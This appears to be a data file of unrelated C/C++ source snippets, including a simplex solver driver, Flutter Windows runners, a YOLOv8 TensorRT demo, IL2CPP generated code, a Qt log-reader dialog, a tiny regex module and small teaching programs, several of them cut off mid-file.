 // vector<int> N = {0, 1};\n\n  // Data d(A, b, c, u, l, B, N, 2, 4);\n\n  // MatrixXd B_inicial = MatrixXd::Identity(2, 2);\n  // Eigen::SparseMatrix<double> B_sparse = B_inicial.sparseView();\n\n  // GS g(B_sparse, 2);\n\n  // MatrixXd A(3, 7);\n  // A.row(0) << 3, 2, 1, 2, 1, 0, 0;\n  // A.row(1) << 1, 1, 1, 1, 0, 1, 0;\n  // A.row(2) << 4, 3, 3, 4, 0, 0, 1;\n\n  // VectorXd b(3);\n  // b << 225, 117, 420;\n\n  // VectorXd c(7);\n  // c << 19, 13, 12, 17, 0, 0, 0;\n\n  // VectorXd u(7);\n  // u << pInf, pInf, pInf, pInf, pInf, pInf, pInf;\n\n  // VectorXd l(7);\n  // l << 0, 0, 0, 0, 0, 0, 0;\n\n  // vector<int> B = {4, 5, 6};\n  // vector<int> N = {0, 1, 2, 3};\n\n  // Data d(A, b, c, u, l, B, N, 3, 7);\n\n  // MatrixXd B_inicial = MatrixXd::Identity(3, 3);\n  // Eigen::SparseMatrix<double> B_sparse = B_inicial.sparseView();\n\n  // GS g(B_sparse, 3);\n\n  MatrixXd A(2, 12);\n  A.row(0) << 3, 1, 5, 6, 9, 4, 3, 4, 7, 6, 4, 5;\n  A.row(1) << 1, 0, 9, 5, 8, 1, 2, 7, 8, 7, 9, 1;\n\n  VectorXd b(2);\n  b << 72, 62;\n\n  VectorXd c(12);\n  c << 2, 1, -2, -2, 3, 2, 3, -4, 0, -2, -3, 3;\n\n  VectorXd u(12);\n  u << pInf, 3, -2, 3, 5, 1, pInf, pInf, 0, 5, pInf, pInf;\n\n  VectorXd l(12);\n  l << -5, nInf, -4, -2, 2, 0, 0, 3, nInf, nInf, nInf, nInf;\n\n  vector<int> B = {0, 1};\n  vector<int> N = {2, 3, 4, 5, 6, 7, 8, 9, 10, 11};\n\n  Data d(A, b, c, u, l, B, N, 2, 12);\n\n  MatrixXd B_inicial(2, 2);\n  B_inicial.col(0) = A.col(0);\n  B_inicial.col(1) = A.col(1);\n  Eigen::SparseMatrix<double> B_sparse = B_inicial.sparseView();\n\n  GS g(B_sparse, 2);\n\n  Simplex s(d, g);\n  s.findInitialSolution();\n\n  while (true)\n  {\n    pair<int, int> variable = s.chooseEnteringVariable();\n    cout << \"variavel de entrada \" << variable.first << \" t_sign: \" << variable.second << endl;\n\n    if (variable.first == -1)\n    {\n      cout << \"Optimal: \" << s.objectiveFunction() << endl;\n      return 0;\n    }\n\n    pair<int, double> leavingVariable = s.chooseLeavingVariable(variable);\n\n    if (leavingVariable.second <= nInf || leavingVariable.second >= pInf)\n    {\n      cout << \"Unbounded\" << endl;\n      return 0;\n    }\n\n    cout << \"variavel de saida \" << leavingVariable.first << \" max_t: \" << leavingVariable.second << endl;\n\n    // atualizando a solu\u00e7\u00e3o\n\n    s.updateBasis(variable, leavingVariable);\n\n    sleep(1);\n  }\n\n  return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"globo_fitness\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//\n// Created by  triple-Mu     on 24-1-2023.\n// Modified by Q-engineering on  6-3-2024\n//\n\n#include \"chrono\"\n#include \"opencv2/opencv.hpp\"\n#include \"yolov8.hpp\"\n\nusing namespace std;\nusing namespace cv;\n\n//#define VIDEO\n\ncv::Size       im_size(640, 640);\nconst int      num_labels  = 80;\nconst int      topk        = 100;\nconst float    score_thres = 0.25f;\nconst float    iou_thres   = 0.65f;\n\nint main(int argc, char** argv)\n{\n    float    f;\n    float    FPS[16];\n    int      i, Fcnt=0;\n    cv::Mat  image;\n    std::chrono::steady_clock::time_point Tbegin, Tend;\n\n    if (argc < 3) {\n        fprintf(stderr,\"Usage: ./YoloV8_RT [model_trt.engine] [image or video path] \\n\");\n        return -1;\n    }\n    const string engine_file_path = argv[1];\n    const string imagepath = argv[2];\n\n    for(i=0;i<16;i++) FPS[i]=0.0;\n\n    cout << \"Set CUDA...\\n\" << endl;\n\n    cudaSetDevice(0);\n\n    cout << \"Loading TensorRT model \" << engine_file_path << endl;\n    cout << \"\\nWait a second....\" << std::flush;\n    auto yolov8 = new YOLOv8(engine_file_path);\n\n    cout << \"\\rLoading the pipe... \" << string(10, ' ')<< \"\\n\\r\" ;\n    cout << endl;\n    yolov8->MakePipe(true);\n\n#ifdef VIDEO\n    VideoCapture cap(imagepath);\n    if (!cap.isOpened()) {\n        cerr << \"ERROR: Unable to open the stream \" << imagepath << endl;\n        return 0;\n    }\n#endif // VIDEO\n\n    while(1){\n#ifdef VIDEO\n        cap >> image;\n        if (image.empty()) {\n            cerr << \"ERROR: Unable to grab from the camera\" << endl;\n            break;\n        }\n#else\n        image = cv::imread(imagepath);\n#endif\n        yolov8->CopyFromMat(image, im_size);\n\n        std::vector<Object> objs;\n\n        Tbegin = std::chrono::steady_clock::now();\n        yolov8->Infer();\n        Tend = std::chrono::steady_clock::now();\n\n        yolov8->PostProcess(objs, score_thres, iou_thres, topk, num_labels);\n        yolov8->DrawObjects(image, objs);\n\n        //calculate frame rate\n        f = std::chrono::duration_cast <std::chrono::milliseconds> (Tend - Tbegin).count();\n        if(f>0.0) FPS[((Fcnt++)&0x0F)]=1000.0/f;\n        for(f=0.0, i=0;i<16;i++){ f+=FPS[i]; }\n        putText(image, cv::format(\"FPS %0.2f\", f/16),cv::Point(10,20),cv::FONT_HERSHEY_SIMPLEX,0.6, cv::Scalar(0, 0, 255));\n\n        //show output\n        imshow(\"Jetson Orin Nano- 8 Mb RAM\", image);\n        char esc = cv::waitKey(1);\n        if(esc == 27) break;\n//      imwrite(\"./out.jpg\", image);\n    }\n    cv::destroyAllWindows();\n\n    delete yolov8;\n\n    return 0;\n}\n",
    "#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nstruct node {\r\n    int data;\r\n    node *next;\r\n};\r\n\r\nstruct list {\r\n    node *head;\r\n    node *tail;\r\n};\r\n\r\nvoid addTail(list *&list, int data) {\r\n    node *newNode = new node;\r\n    if (list->head == nullptr) {\r\n        newNode->data = data;\r\n        newNode->next = nullptr;\r\n        list->head = list->tail = newNode;\r\n    } else {\r\n        newNode->data = data;\r\n        list->tail->next = newNode;\r\n        list->tail = newNode;\r\n        list->tail->next = nullptr;\r\n    }\r\n}\r\n\r\nvoid addHead(list *&list, int data) {\r\n    node *newNode = new node;\r\n    if (list->head == nullptr) {\r\n        newNode->next = nullptr;\r\n        newNode->data = data;\r\n        list->head = list->tail = newNode;\r\n    } else {\r\n        newNode->data = data;\r\n        newNode->next = list->head;\r\n        list->head = newNode;\r\n    }\r\n}\r\n\r\nvoid createEmptyList(list *&lst) {\r\n    lst = new list;\r\n    lst->head = nullptr;\r\n    lst->tail = nullptr;\r\n}\r\n\r\nvoid importList(list *&list) {\r\n    addTail(list, 3);\r\n    addHead(list, 8);\r\n    addTail(list, 5);\r\n    addHead(list, 1);\r\n    addHead(list, 7);\r\n    addTail(list, 9);\r\n    addHead(list, 13);\r\n}\r\n\r\nvoid printList(list *list) {\r\n    node* pointer = list->head;\r\n    while(pointer != nullptr) {\r\n        cout << pointer->data << \" \";\r\n        pointer = pointer->next;\r\n    }\r\n}\r\n\r\nint main() {\r\n    list *list;\r\n    createEmptyList(list);\r\n    importList(list);\r\n    printList(list);\r\n    return 0;\r\n}\r\n",
    "//https://www.luogu.com.cn/problem/P5026\r\n//P5026 Lycanthropy\r\n/*\r\n\r\n*/\r\n#include<iostream>\r\n#include<vector>\r\nusing namespace std;\r\n\r\nconst int MAXN = 1e6;\r\nconst int OFFSET = 30001;\r\nvector<long long> cnt(OFFSET + MAXN + OFFSET, 0);\r\nint m; //length\r\nint n; //num of friends\r\n\r\nvoid set(int l, int r, int s, int e, int d){\r\n    cnt[l + OFFSET] += s;\r\n    cnt[l + 1 + OFFSET] += d - s;\r\n    cnt[r + 1 + OFFSET] -= d + e;\r\n    cnt[r + 2 + OFFSET] += e;\r\n}\r\n\r\nvoid build(){\r\n    for(int i = 1; i <= m + OFFSET; ++i){\r\n        cnt[i] += cnt[i - 1];\r\n    }\r\n    for(int i = 1; i <= m + OFFSET; ++i){\r\n        cnt[i] += cnt[i - 1];\r\n    }\r\n}\r\n\r\nint main(){\r\n//(i-v+1, i, -1, -v, -1)\r\n//(i+1, i+v-1, -v+1, -1, -1)\r\n\r\n//(i-v-1, i-2*v-1, 1, v-1, 1)\r\n//(i-2*v, i-3*v+1, v, 1, -1)\r\n\r\n//(i+v+1, i+2*v-1, 1, v-1, 1)\r\n//(i+2*v, i+3*v-1, v, 1, -1)\r\n    cin >> n >> m;\r\n    //cnt.assign(m+2,0);\r\n    for(int i = 0; i < n; ++i){\r\n        int v,x;//volume and where\r\n        cin >> v >> x;\r\n        set(x - 3 * v + 1, x - 2 * v, 1, v, 1);\r\n\t\tset(x - 2 * v + 1, x, v - 1, -v, -1);\r\n\t\tset(x + 1, x + 2 * v, -v + 1, v, 1);\r\n\t\tset(x + 2 * v + 1, x + 3 * v - 1, v - 1, 1, -1);\r\n    }\r\n    build();\r\n    int start = 1 + OFFSET;\r\n    cout << cnt[start++];\r\n    for(int i = 2; i <= m; i++){\r\n        cout << \" \" << cnt[start++];\r\n    }\r\n    \r\n}",
    "\ufeff#include \"pch-cpp.hpp\"\n\n#ifndef _MSC_VER\n# include <alloca.h>\n#else\n# include <malloc.h>\n#endif\n\n\n\n\n\n\n\nIL2CPP_EXTERN_C const Il2CppMethodPointer g_ReversePInvokeWrapperPointers[];\nIL2CPP_EXTERN_C const Il2CppMethodPointer g_Il2CppGenericMethodPointers[];\nIL2CPP_EXTERN_C const Il2CppMethodPointer g_Il2CppGenericAdjustorThunks[];\nIL2CPP_EXTERN_C const InvokerMethod g_Il2CppInvokerPointers[];\nIL2CPP_EXTERN_C const Il2CppMethodPointer g_UnresolvedVirtualMethodPointers[];\nIL2CPP_EXTERN_C Il2CppInteropData g_Il2CppInteropData[];\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_AssemblyU2DCSharp_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_Boxophobic_Utils_Scripts_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_Cinemachine_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_Mono_Security_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_System_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_System_Configuration_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_System_Core_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_System_Xml_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_AIModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_AndroidJNIModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_AnimationModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_AudioModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_CoreModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_DirectorModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_GridModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_IMGUIModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_InputLegacyModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_InputModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_JSONSerializeModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_ParticleSystemModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_Physics2DModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_PhysicsModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_SharedInternalsModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_SpriteShapeModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_SubsystemsModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_TerrainModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_TerrainPhysicsModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_TextCoreFontEngineModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_TextCoreTextEngineModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_TextRenderingModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_TilemapModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_UIElementsModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_UIElementsNativeModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_UIModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_UI_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_VRModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_UnityEngine_XRModule_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_Unity_Burst_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_Unity_Burst_Unsafe_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_Unity_InputSystem_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_Unity_Mathematics_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_Unity_RenderPipeline_Universal_ShaderLibrary_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_Unity_RenderPipelines_Core_Runtime_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_Unity_RenderPipelines_Universal_Runtime_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_Unity_TextMeshPro_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_Unity_Timeline_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g___Generated_CodeGenModule;\nIL2CPP_EXTERN_C_CONST Il2CppCodeGenModule g_mscorlib_CodeGenModule;\nIL2CPP_EXTERN_C const Il2CppCodeGenModule* g_CodeGenModules[];\nconst Il2CppCodeGenModule* g_CodeGenModules[49] = \n{\n\t(&g_AssemblyU2DCSharp_CodeGenModule),\n\t(&g_Boxophobic_Utils_Scripts_CodeGenModule),\n\t(&g_Cinemachine_CodeGenModule),\n\t(&g_Mono_Security_CodeGenModule),\n\t(&g_System_CodeGenModule),\n\t(&g_System_Configuration_CodeGenModule),\n\t(&g_System_Core_CodeGenModule),\n\t(&g_System_Xml_CodeGenModule),\n\t(&g",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"jogger\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"CDlgMain.hpp\"\n#include \"ui_CDlgMain.h\"\n#include <QFileDialog>\n\nCDlgMain::CDlgMain(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::CDlgMain)\n{\n    ui->setupUi(this);\n\n    QString iStr2 = \"v0.01 <2024.03.25(01)>\";\n\n#if DEBUG\n    this->setWindowTitle(\"TickToBin (DEBUG Mode) \" + iStr2);\n#elif RELEASE\n    this->setWindowTitle(\"TickToBin \" + iStr2);\n#endif\n}\n\nCDlgMain::~CDlgMain()\n{\n    delete ui;\n}\n\nvoid CDlgMain::slotBtnOpenFile(void)\n{\n    // .txt \ud615\ud0dc\uc758 \ud30c\uc77c\uc744 \uc120\ud0dd\ud560 \uc218 \uc788\ub294 \ub2e4\uc774\uc5bc\ub85c\uadf8\n    QString filename = QFileDialog::getOpenFileName(this, \"\ud30c\uc77c \uc120\ud0dd\", QDir::currentPath(), \"Files (*.txt)\");\n\n    mFile.setFileName(filename);\n    if(mFile.open(QIODevice::ReadOnly | QIODevice::Text) == false)\n    {\n        ui->teLog1->setText(tr(\"\ud30c\uc77c \uc5ec\ub294 \uc911 \uc5d0\ub7ec \ubc1c\uc0dd\"));\n        return;\n    }\n\n    mTxtStream.setDevice(&mFile);\n    // \ud14d\uc2a4\ud2b8 \uc2a4\ud2b8\ub9bc\uc774 \uc5b4\ub5a4 \ubc29\uc2dd\uc73c\ub85c \ub514\ucf54\ub529 \ud560 \uac83\uc778\uc9c0 \uacb0\uc815\ud574 \uc900\ub2e4.\n    // QStringConverter::System\uc744 \ucc44\ud0dd -> \ud604\uc7ac \uc2dc\uc2a4\ud15c\uc758 \ub85c\uce98 \uc815\ubcf4\ub97c \uadf8\ub300\ub85c \uc801\uc6a9\ud574 \uc8fc\ub3c4\ub85d \uc124\uc815.\n    mTxtStream.setEncoding(QStringConverter::System);\n}\n\nvoid CDlgMain::slotBtnNextTR(void)\n{\n    QString strLine, strTmp;\n\n    while (true)\n    {\n        if(!mTxtStream.atEnd())\n        {\n            strLine = mTxtStream.readLine();\n\n            if(mFile.isOpen())\n            {\n                qDebug() << \"file is open\";\n            }\n\n            // 'I702S' \ub4f1\uacfc \uac19\uc774 \uccab 5\uc790\ub9ac\uc758 TR \ubb38\uc790\uc5f4\ub9cc\uc744 \ucd94\ub824\ub0b8\ub2e4.\n            strTmp = strLine.mid(lenEpochTime + 1);\n            QString strTmpTrCode = strTmp.mid(0, 5);\n\n            // TR \uc815\ubcf4\ub294 16\uc790\ub9ac\uc758 epoch time \uadf8\ub9ac\uace0 \ucf5c\ub860\uc73c\ub85c \uc2dc\uc791\ud558\ubbc0\ub85c, \uc774 \ub77c\uc778\ub4e4\ub9cc \uace8\ub77c\ub0b4\uae30 \uc704\ud55c \uc870\uac74\n            // 1705351201881283:I702S00000010KRA5812AXDB30001720231127202408010000000001000000000000R0000000000015.0000000000000000003000300000000000000000000.000000000000000005000.000000000000000000000.000000000000000000000.000\n            // \ucd94\ub824\ub0b8 TR\uc774 \ubc84\ub9b4 \uc218 \uc5c6\ub294 TR \ubaa9\ub85d\uc5d0 \ub4e4\uc5b4\uac00 \uc788\ub294\uc9c0 \uc5ec\ubd80\ub97c \uba3c\uc800 \ud655\uc778.\n            if (strLine.length() >= lenEpochTime && strLine.at(lenEpochTime) == ':' && mTR_CODE_SIZE.contains(strTmpTrCode))\n            {\n                trInterface strctTr = mTR_CODE_SIZE.value(strTmpTrCode);\n                qDebug() << \"Data length specification for \" << strTmpTrCode << \": \" << strctTr.size;\n                qDebug() << \"Actual line length for \" << strTmpTrCode << \": \" << strLine.length();\n\n                ui->teLog1->setText(strTmp);\n\n                qint64 epochTime = strLine.left(lenEpochTime).toLongLong();\n                epochTime = epochTime / 1000;\n                QDateTime dateTime = dateTime.fromMSecsSinceEpoch(epochTime);\n                ui->leRcvTM->setText(dateTime.toString(\"HH:mm:ss.zzz\"));\n                break;\n            }\n        }\n        else\n        {\n            // \ub2e4\uc2dc \ud14d\uc2a4\ud2b8 \uc2a4\ud2b8\ub9bc\uc774 \ubb38\uc790\uc5f4\uc744 \uc77d\uc5b4\ub4e4\uc77c \uc218 \uc788\ub3c4\ub85d \ub9ac\uc14b\n            mTxtStream.device()->reset();\n            return;\n        }\n    }\n    return;\n}\n",
    "#include \"tokn.h\"\n\n/* tiny-regex-c\n * https://github.com/kokke/tiny-regex-c\n * Unlicense\n *\n * Mini regex-module inspired by Rob Pike's regex code described in:\n *\n * http://www.cs.princeton.edu/courses/archive/spr09/cos333/beautiful.html\n *\n * Modified for use in this package.\n *\n * Supports:\n * ---------\n *   '.'        Dot, matches any character\n *   '^'        Start anchor, matches beginning of string\n *   '$'        End anchor, matches end of string\n *   '*'        Asterisk, match zero or more (greedy)\n *   '+'        Plus, match one or more (greedy)\n *   '?'        Question, match zero or one (non-greedy)\n *   '[abc]'    Character class, match if one of {'a', 'b', 'c'}\n *   '[a-zA-Z]' Character ranges, the character set of the ranges { a-z | A-Z }\n *   '\\s'       Whitespace, \\t \\f \\r \\n \\v and spaces\n *   '\\S'       Non-whitespace\n *   '\\w'       Alphanumeric, [a-zA-Z0-9_]\n *   '\\W'       Non-alphanumeric\n *   '\\d'       Digits, [0-9]\n *   '\\D'       Non-digits\n */\n\n#include <stdio.h>\n#include <ctype.h>\n\n/* Definitions: */\n#define MAX_REGEXP_OBJECTS 30 /* Max number of regex symbols in expression. */\n#define MAX_CHAR_CLASS_LEN 40 /* Max length of character-class buffer in.   */\n\nenum { UNUSED, DOT, BEGIN, END, QUESTIONMARK, STAR, PLUS, CHAR, CHAR_CLASS, INV_CHAR_CLASS, DIGIT, NOT_DIGIT, ALPHA, NOT_ALPHA, WHITESPACE, NOT_WHITESPACE, /* BRANCH */ };\n\ntypedef struct regex_t\n{\n\tunsigned char type;   /* CHAR, STAR, etc. */\n\tunion\n\t{\n\t\tunsigned char  ch;  /*     The character itself             */\n\t\tunsigned char *ccl; /* OR  a posigneder to characters in class */\n\t} u;\n} regex_t;\n\n/* Private function declarations: */\nstatic signed   re_match(const char *pattern, const char *text, signed textlength, signed *matchlength);\nstatic signed   re_matchp(regex_t *pattern, const char *text, signed textlength, signed *matchlength);\nstatic regex_t *re_compile(const char *pattern);\nstatic void     re_prsigned(regex_t *pattern);\nstatic signed   matchpattern(regex_t *pattern, const char *text, signed textlength, signed *matchlength);\nstatic signed   matchcharclass(char c, const char* str);\nstatic signed   matchstar(regex_t p, regex_t *pattern, const char *text, signed textlength, signed *matchlength);\nstatic signed   matchplus(regex_t p, regex_t *pattern, const char *text, signed textlength, signed *matchlength);\nstatic signed   matchone(regex_t p, char c);\nstatic signed   matchdigit(char c);\nstatic signed   matchalpha(char c);\nstatic signed   matchwhitespace(char c);\nstatic signed   matchmetachar(char c, const char *str);\nstatic signed   matchrange(char c, const char *str);\nstatic signed   matchdot(char c);\nstatic signed   ismetachar(char c);\n\n/* Public functions: */\nstatic signed re_match(const char *pattern, const char *text, signed textlength, signed *matchlength)\n{\n\treturn re_matchp(re_compile(pattern), text, textlength, matchlength);\n}\n\nstatic signed re_matchp(regex_t *pattern, const char *text, signed textlength, signed *matchlength)\n{\n\t*matchlength = 0;\n\tif (pattern != 0) {\n\t\tif (pattern[0].type == BEGIN) {\n\t\t\treturn ((matchpattern(&pattern[1], text, textlength, matchlength)) ? 0 : -1);\n\t\t} else {\n\t\t\tsigned idx = -1;\n\n\t\t\tdo {\n\t\t\t\tidx += 1;\n\n\t\t\t\tif (matchpattern(pattern, text, textlength, matchlength)) {\n\t\t\t\t\tif (text[0] == '\\0') {\n\t\t\t\t\t\treturn -1;\n\t\t\t\t\t}\n\n\t\t\t\t\treturn idx;\n\t\t\t\t}\n\t\t\t} while (*text++ != '\\0' && --textlength > 0);\n\t\t}\n\t}\n\treturn -1;\n}\n\nstatic regex_t* re_compile(const char *pattern)\n{\n\t/* The sizes of the two static arrays below substantiates the static RAM usage of this module.\n\t\tMAX_REGEXP_OBJECTS is the max number of symbols in the expression.\n\t\tMAX_CHAR_CLASS_LEN determines the size of buffer for chars in all char-classes in the expression. */\n\tstatic regex_t re_compiled[MAX_REGEXP_OBJECTS];\n\tstatic unsigned char ccl_buf[MAX_CHAR_CLASS_LEN];\n\tsigned ccl_bufidx = 1;\n\n\tchar c;     /* current char in pattern   */\n\tsigned i = 0;  /* index signedo pattern        */\n\tsigned j = 0;  /* index signedo re_compiled    */\n\n\twhile (pattern[i] != '\\0' && (j+1 < MAX_REGEXP_OBJECTS)) {\n\t\tc = pattern[i];\n\n\t\tswitch (c) {\n\t\t\t/* Meta-characters: */\n\t\t\tcase '^': { re_compiled[j].type = BEGIN;        } break;\n\t\t\tcase '$': { re_compiled[j].type = END;          } break;\n\t\t\tcase '.': { re_compiled[j].type = DOT;          } break;\n\t\t\tcase '*': { re_compiled[j].type = STAR;         } break;\n\t\t\tcase '+': { re_compiled[j].type = PLUS;         } break;\n\t\t\tcase '?': { re_compiled[j].type = QUESTIONMARK; } break;\n\t\t/*    case '|': {    re_compiled[j].type = BRANCH;          } break; <-- not working properly */\n\n\t\t\t/* Escaped character-classes (\\s \\w ...): */\n\t\t\tcase '\\\\':\n\t\t\t{\n\t\t\tif (pattern[i+1] != '\\0') {\n\t\t\t\t/* Skip the escape-char '\\\\' */\n\t\t\t\ti += 1;\n\t\t\t\t/* ... and check the next */\n\t\t\t\tswitch (pattern[i]) {\n\t\t\t\t/* Meta-character: */\n\t\t\t\tcase 'd': { re_compiled[j].type = DIGIT;          } break;\n\t\t\t\tcase 'D': { re_compiled[j].type = NOT_DIGIT;      } break;\n\t\t\t\tcase 'w': { re_compiled[j].type = ALPHA;          } break;\n\t\t\t\t",
    "#include <iostream>\n\n// Function declarations\nvoid showMenu();\nvoid addNumbers();\nvoid subtractNumbers();\nvoid multiplyNumbers();\nvoid divideNumbers();\n\nint main() {\n    int choice;\n\n    do {\n        showMenu();\n        std::cin >> choice;\n\n        switch (choice) {\n            case 1:\n                addNumbers();\n                break;\n            case 2:\n                subtractNumbers();\n                break;\n            case 3:\n                multiplyNumbers();\n                break;\n            case 4:\n                divideNumbers();\n                break;\n            case 5:\n                std::cout << \"Exiting the application. Goodbye!\" << std::endl;\n                break;\n            default:\n                std::cout << \"Invalid choice. Please select a valid option.\" << std::endl;\n        }\n    } while (choice != 5);\n\n    return 0;\n}\n\nvoid showMenu() {\n    std::cout << \"===============================\" << std::endl;\n    std::cout << \"  Fun Simple C++ Application   \" << std::endl;\n    std::cout << \"===============================\" << std::endl;\n    std::cout << \"1. Add two numbers\" << std::endl;\n    std::cout << \"2. Subtract two numbers\" << std::endl;\n    std::cout << \"3. Multiply two numbers\" << std::endl;\n    std::cout << \"4. Divide two numbers\" << std::endl;\n    std::cout << \"5. Exit\" << std::endl;\n    std::cout << \"Choose an option: \";\n}\n\nvoid addNumbers() {\n    double num1, num2;\n    std::cout << \"Enter two numbers to add: \";\n    std::cin >> num1 >> num2;\n    std::cout << \"The sum is: \" << num1 + num2 << std::endl;\n}\n\nvoid subtractNumbers() {\n    double num1, num2;\n    std::cout << \"Enter two numbers to subtract: \";\n    std::cin >> num1 >> num2;\n    std::cout << \"The difference is: \" << num1 - num2 << std::endl;\n}\n\nvoid multiplyNumbers() {\n    double num1, num2;\n    std::cout << \"Enter two numbers to multiply: \";\n    std::cin >> num1 >> num2;\n    std::cout << \"The product is: \" << num1 * num2 << std::endl;\n}\n\nvoid divideNumbers() 